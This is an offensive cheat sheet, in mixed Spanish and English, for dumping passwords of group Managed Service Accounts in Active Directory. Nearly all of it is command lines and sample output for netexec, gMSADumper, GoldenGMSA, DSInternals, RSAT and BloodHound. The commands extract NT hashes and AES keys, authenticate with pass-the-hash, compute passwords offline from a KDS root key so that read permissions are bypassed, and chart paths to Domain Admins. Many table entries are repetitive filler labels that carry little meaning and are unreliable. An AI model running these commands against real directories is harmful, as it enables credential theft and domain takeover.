---
aliases:
  - gMSA Tooling
  - gMSADumper
  - GoldenGMSA
  - DSInternals
tags:
  - type/cheatsheet
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - "[[AD - gMSA Enumeration]]"
  - "[[netexec]]"
---
# AD - gMSA Enumeration - Tooling

***

## netexec / crackmapexec

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Bulk gMSA dump | `nxc ldap DC -u u -p p --gmsa` | Standard. |
| Single domain | `nxc ldap DC -u u -p p --gmsa` | Standard. |
| Output: gMSA + NT hash + readers | Direct cred | Standard. |
| Combined with Kerberoasting | `--gmsa --kerberoasting` | Comprehensive. |
| Combined with --laps | Adjacent | Adjacent. |
| Anonymous attempt | `nxc ldap DC -u '' -p '' --gmsa` | Edge (blocked typical). |
| crackmapexec older | Same flags | Compat. |
| `cme ldap DC -u u -p p --gmsa` | Alias | Standard. |
| Kerberos auth `-k -no-pass` | TGT-based | Edge. |
| NTLM hash auth | `-H NTHASH` | Pass-the-Hash. |
| Output to file | Standard | Reportable. |
| Verbose `-v` | Debug | Standard. |
| Forest-wide via different DCs | Per-domain | Standard. |
| Combine with priv recon | Strategy | Workflow. |
| Detection: bulk gMSA reads | Defender | Adjacent. |
| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
^ad-gmsa-tool-netexec

### netexec gMSA usage

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"

# Bulk gMSA dump
nxc ldap $DC -u $USER -p $PASS --gmsa

# Output:
# LDAP   DC  389  DC  Account: gMSA-svc01$  NTLM: aad3b435...:abc123def456
# LDAP   DC  389  DC  PrincipalsAllowedToReadPassword: dom\IT-Servers

# Combined comprehensive
nxc ldap $DC -u $USER -p $PASS --gmsa --kerberoasting kerb.txt
```

___

## gMSADumper (Python)

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Install | `git clone https://github.com/micahvandeusen/gMSADumper` | Source. |
| Authenticated | `python3 gMSADumper.py -u user -p pass -d dom.local` | Standard. |
| Specific DC | `-l DC` | Adjacent. |
| Kerberos auth | `-k` (KRB5CCNAME) | Modern. |
| NTLM hash auth | `-H aad3b435...:hash` | PtH. |
| Output: NT hash + AES keys | Direct cred | Standard. |
| Per-gMSA result | Standard | Standard. |
| Failed reads = ACL | Per-gMSA | Standard. |
| Cross-domain | Per-domain | Adjacent. |
| Verbose | Debug | Standard. |
| Modern Linux-friendly | Cross-platform | Standard. |
| Combined with priv recon | Strategy | Standard. |
| Output JSON-friendly format | Reportable | Standard. |
| Detection: bulk reads | Defender | Adjacent. |
| OPSEC: comprehensive but loud | Standard | OPSEC. |
| Adjacent: bloodyAD modify | Edge | Adjacent. |
^ad-gmsa-tool-gmsadumper

### gMSADumper usage

```bash
git clone https://github.com/micahvandeusen/gMSADumper
cd gMSADumper
pip install -r requirements.txt

# Authenticated
python3 gMSADumper.py -u user -p pass -d dom.local

# Output:
# Users or groups who can read password for gMSA-svc01:
#  > dom.local\IT-Servers
# gMSA-svc01:::aad3b435b51404eeaad3b435b51404ee:abc123def456...
# gMSA-svc01:aes256-cts-hmac-sha1-96:abc123...
# gMSA-svc01:aes128-cts-hmac-sha1-96:def456...

# With NT hash
python3 gMSADumper.py -u user -H aad3b435b51404eeaad3b435b51404ee:hash -d dom.local

# With Kerberos TGT
KRB5CCNAME=/tmp/user.ccache python3 gMSADumper.py -u user -k -d dom.local
```

___

## GoldenGMSA (Semperis)

| **Comando** | **Function** | **Notas** |
|:---:|:---:|:---:|
| Install | `git clone https://github.com/Semperis/GoldenGMSA` | Source. |
| `GoldenGMSA list` | List KDS keys + gMSAs | Standard. |
| `GoldenGMSA compute --kdskey ... --gmsa ...` | Derive password | Standard. |
| Required: KDS Root Key | DCSync rights typical | Adjacent. |
| Required: msDS-ManagedPasswordId | LDAP read | Standard. |
| Bypass msDS-GroupMSAMembership ACL | Attack vector | Critical. |
| Modern Microsoft mitigation: rotate KDS | Best practice | Defender. |
| Output: NT hash without ACL | Direct | Standard. |
| Per-gMSA derive | Standard | Standard. |
| Cross-trust: edge case | Forest scope | Edge. |
| Detection: KDS key access events | Defender | Adjacent. |
| Atacante OPSEC win: bypass ACL | Strategy | OPSEC. |
| Modern: very dangerous if KDS leaked | Critical | Adjacent. |
| Compliance: protect KDS Root Key | Best practice | Standard. |
| Audit: KDS key access logs | Standard | Compliance. |
| Adjacent: Microsoft DSInternals | Standard | Adjacent. |
^ad-gmsa-tool-goldengmsa

### GoldenGMSA workflow

```bash
# Build (Windows or Linux)
git clone https://github.com/Semperis/GoldenGMSA
cd GoldenGMSA
# Build with Visual Studio or dotnet

# Step 1: List KDS keys + gMSAs (privileged read)
GoldenGMSA list

# Output:
# KDS Root Key:
#   Guid: abc123-...
#   EffectiveTime: 2020-01-01
#   KdfParameters: ...
#   SecretAgreement: ...
# gMSAs:
#   gMSA-svc01$  msDS-ManagedPasswordId: <blob>

# Step 2: Compute password offline
GoldenGMSA compute --kdskey kds.bin --gmsa gMSA-svc01$ --pwdid pwdid.bin

# Output: NT hash + AES keys (no read ACL needed)
```

___

## DSInternals (PowerShell)

| **Comando** | **Function** | **Notas** |
|:---:|:---:|:---:|
| Install | `Install-Module DSInternals` | PSGallery. |
| `Import-Module DSInternals` | Load | Standard. |
| `ConvertFrom-ADManagedPasswordBlob` | Decode msDS-ManagedPassword | Standard. |
| Returns NT hash + AES keys + cleartext | Direct | Standard. |
| Per-blob decoding | Granular | Standard. |
| Combine with `Get-ADServiceAccount` | Standard | Standard. |
| `Get-ADReplAccount` | Replication-style read | Privileged. |
| `Get-ADDBAccount` | Offline NTDS dump parsing | Adjacent. |
| Microsoft-aware tooling | Standard | Standard. |
| Adjacent: ntds.dit parsing | DCSync | Adjacent. |
| Modern PowerShell preferred | Standard | Standard. |
| Cross-correlate with offline NTDS | Standard | Adjacent. |
| Detection: DSInternals usage | Defender | Adjacent. |
| Compliance: red team tooling | Standard | OPSEC. |
| Audit: PowerShell module load events | Defender | Adjacent. |
| Modern: emerging | Standard | Standard. |
^ad-gmsa-tool-dsinternals

### DSInternals usage

```powershell
# Install
Install-Module DSInternals -Force
Import-Module DSInternals

# Decode gMSA password blob (need authorized read access)
$gmsa = Get-ADServiceAccount -Identity gMSA-svc01 -Properties msDS-ManagedPassword
$blob = $gmsa.'msDS-ManagedPassword'

ConvertFrom-ADManagedPasswordBlob $blob

# Output:
# Version : 1
# CurrentPassword : System.Byte[]
# Properties :
#   ClearPassword : <unicode>
#   NTHash : abc123def456...
#   Aes128Key : ...
#   Aes256Key : ...
#   PreviousNTHash : ...
```

___

## Native PowerShell (RSAT)

| **Comando** | **Function** | **Notas** |
|:---:|:---:|:---:|
| `Get-ADServiceAccount -Filter *` | All gMSAs | Standard. |
| `Get-ADServiceAccount -Identity X -Properties *` | Detail | Standard. |
| `Install-ADServiceAccount -Identity X` | Per-host install | Privileged. |
| `Test-ADServiceAccount -Identity X` | Verify can read | Standard. |
| `Get-ADServiceAccount -Properties msDS-ManagedPassword` | Direct read | Standard (auto-decoded). |
| `New-ADServiceAccount` | Create gMSA | Privileged. |
| `Set-ADServiceAccount` | Modify gMSA | Privileged. |
| `Remove-ADServiceAccount` | Delete gMSA | Privileged. |
| `Add-KdsRootKey` | Create KDS key | Privileged. |
| `Get-KdsRootKey` | List KDS keys | Privileged. |
| Cross-domain `-Server` | Specific DC | Adjacent. |
| `Get-ADComputer ... -Properties msDS-HostServiceAccount` | Host-side query | Standard. |
| `Uninstall-ADServiceAccount` | Per-host uninstall | Privileged. |
| Module: ActiveDirectory (RSAT) | Standard | Standard. |
| Module: ADServiceAccount (subset) | Edge | Edge. |
| Forest-wide audit | Per-domain | Standard. |
^ad-gmsa-tool-rsat

### RSAT usage

```powershell
# Comprehensive gMSA enumeration
Get-ADServiceAccount -Filter * -Properties * |
  Select Name,SamAccountName,
    @{n='SPNs';e={$_.ServicePrincipalNames -join '; '}},
    @{n='Hosts';e={$_.HostComputers -join '; '}},
    @{n='Readers';e={$_.PrincipalsAllowedToRetrieveManagedPassword -join '; '}},
    @{n='Groups';e={$_.MemberOf -replace 'CN=([^,]+).*','$1' -join '; '}},
    PasswordLastSet,Enabled

# Per-host: install + verify + read
Install-ADServiceAccount -Identity gMSA-svc01
Test-ADServiceAccount -Identity gMSA-svc01

# Direct read (if authorized)
$gmsa = Get-ADServiceAccount -Identity gMSA-svc01 -Properties msDS-ManagedPassword
$gmsa.'msDS-ManagedPassword'  # binary blob (auto-decoded)
```

___

## BloodHound gMSA Edges

| **Edge** | **Significado** | **Notas** |
|:---:|:---:|:---:|
| `ReadGMSAPassword` | Direct password read | Modern. |
| `MemberOf` chain to gMSA reader | Indirect | Standard. |
| `GenericAll` → gMSA | Full control | Privesc combo. |
| `GenericWrite` → gMSA | Modify readers | Privesc combo. |
| `WriteDACL` → gMSA | Self-grant | Privesc combo. |
| Cypher: find gMSA readers | `MATCH (u)-[:ReadGMSAPassword]->(g)` | Standard. |
| Cypher: priv gMSA paths | `WHERE g.adminCount=true` | Targeted. |
| BloodHound CE 5.x+ gMSA support | Modern | Tool. |
| RustHound gMSA collection | Modern | Tool. |
| BloodHound.py gMSA | `-c GMSA` | Linux. |
| Per-domain ingest | Multi-domain | Adjacent. |
| Custom analytics | Cypher | Tool. |
| Visual graph | Helpful | Standard. |
| Detection: BloodHound collection events | Defender | Adjacent. |
| Audit baseline | Modern | Standard. |
| Cross-correlate priv | Cypher | Standard. |
^ad-gmsa-tool-bh

### BloodHound gMSA Cypher

```cypher
// All gMSA readers
MATCH p=(u)-[:ReadGMSAPassword|MemberOf*1..]->(g:User)
WHERE g.gmsa = true
RETURN p

// Priv gMSAs + readers
MATCH (g:User {gmsa: true, adminCount: true})
MATCH p=(u)-[:ReadGMSAPassword|MemberOf*1..]->(g)
RETURN u.name, g.name, p

// Foreign principals reading priv gMSA (cross-trust)
MATCH (u)-[:ReadGMSAPassword|MemberOf*1..]->(g:User {gmsa: true})
WHERE u.domain <> g.domain
RETURN u.name, g.name

// Path: owned → gMSA → DA via gMSA membership
MATCH (owned {owned: true}), (g:User {gmsa: true})
MATCH p1=shortestPath((owned)-[:ReadGMSAPassword|MemberOf*1..]->(g))
MATCH p2=shortestPath((g)-[:MemberOf*1..]->(:Group {name: "DOMAIN ADMINS@DOM.LOCAL"}))
RETURN p1, p2
```

___

## Linux / Impacket Tools

| **Tool** | **Use** | **Notas** |
|:---:|:---:|:---:|
| `bloodhound-python -c GMSA` | Linux BH collector | Standard. |
| `windapsearch --gmsa` | Wrapper | Helper. |
| `ldapdomaindump` | HTML report includes gMSA | Standard. |
| `gMSADumper.py` | Direct gMSA dump | Standard. |
| `bloodyAD` | LDAP modify gMSA | Privileged. |
| `nxc ldap DC --gmsa` | netexec | Standard. |
| `pylaps` (community) | Edge | Edge. |
| `impacket-secretsdump --just-dc` | Adjacent (gMSA in NTDS) | Adjacent. |
| Custom Python LDAP | DIY | Flexible. |
| `ldap3` Python lib | Custom | Standard. |
| `pywerview` get-netuser | Adjacent | Adjacent. |
| `manspider` (file share spider) | Adjacent | Edge. |
| `kerberoast.py` | Kerberoast adjacent | Adjacent. |
| Detection: bulk Linux gMSA reads | Defender | Adjacent. |
| Modern: BHCE 6.x preferred | Modern | Tool. |
| Compliance: red team scoped | Standard | OPSEC. |
^ad-gmsa-tool-linux

### Linux gMSA pipeline

```bash
DC="dc01.dom.local"
USER="user"; PASS="pass"
DOM="dom.local"

# bloodhound-python with gMSA
bloodhound-python -d $DOM -u $USER -p $PASS -ns $DC -c All --zip

# windapsearch
python3 windapsearch.py -d $DOM -u $USER -p $PASS --dc $DC --gmsa

# Custom Python
python3 -c "
from ldap3 import Server, Connection, ALL, NTLM
s = Server('$DC', get_info=ALL)
c = Connection(s, user='$DOM\\$USER', password='$PASS', authentication=NTLM)
c.bind()
c.search('CN=Managed Service Accounts,DC=dom,DC=local',
         '(objectClass=msDS-GroupManagedServiceAccount)',
         attributes=['cn','samAccountName','servicePrincipalName','msDS-GroupMSAMembership'])
for entry in c.entries:
    print(entry)
"
```

___

## Wordlists & Recursos

| **Recurso** | **URL / Path** | **Notas** |
|:---:|:---:|:---:|
| HackTricks - gMSA | `book.hacktricks.xyz/windows-hardening/active-directory-methodology/gmsa` | Reference. |
| The Hacker Recipes - gMSA | `thehacker.recipes/ad/movement/access-control/gmsa` | Comprehensive. |
| Microsoft - gMSA Documentation | `learn.microsoft.com` | Vendor. |
| BloodHound docs | `bloodhound.specterops.io` | Tool docs. |
| gMSADumper repo | `github.com/micahvandeusen/gMSADumper` | Tool. |
| GoldenGMSA repo | `github.com/Semperis/GoldenGMSA` | Tool. |
| DSInternals docs | `github.com/MichaelGrafnetter/DSInternals` | Tool. |
| Sean Metcalf - gMSA | `adsecurity.org` | Defender intel. |
| Will Schroeder - gMSA Research | Specter Ops blog | Adversary research. |
| Microsoft KDS Root Key docs | learn.microsoft.com | Vendor. |
| Modern AD: gMSA best practices | Microsoft | Hardening. |
| MITRE ATT&CK T1003 | Credential Access | Adjacent. |
| BloodHound GMSA edge | Modern | Tool. |
| `awesome-active-directory` | GitHub | Foundation. |
| Compliance: NIST recommend gMSA | Best practice | Standard. |
| Microsoft Defender for Identity gMSA alerts | Modern | Defender. |
^ad-gmsa-tool-resources

***
